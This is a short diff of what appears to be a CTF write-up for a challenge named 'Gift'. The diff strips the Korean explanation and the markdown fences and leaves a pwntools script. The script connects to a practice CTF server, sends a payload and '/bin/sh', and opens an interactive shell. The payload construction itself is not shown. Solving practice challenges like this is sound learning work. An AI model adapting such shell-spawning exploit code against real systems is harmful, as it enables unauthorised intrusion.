@@ -1,10 +1,3 @@
-# Gift
-
-실행시키면 "/bin/sh"를 입력할 수 있는 영역의 주소와 system함수의 주소를 알려준다.   
-이를 이용하면 쉽게 해결할 수 있다.   
-</br>
-
-```
 from pwn import *
 
 p = remote('ctf.j0n9hyun.xyz', 3018)
@@ -38,4 +31,3 @@ p.sendline(payload)
 p.sendline('/bin/sh\00')
 
 p.interactive()
-```
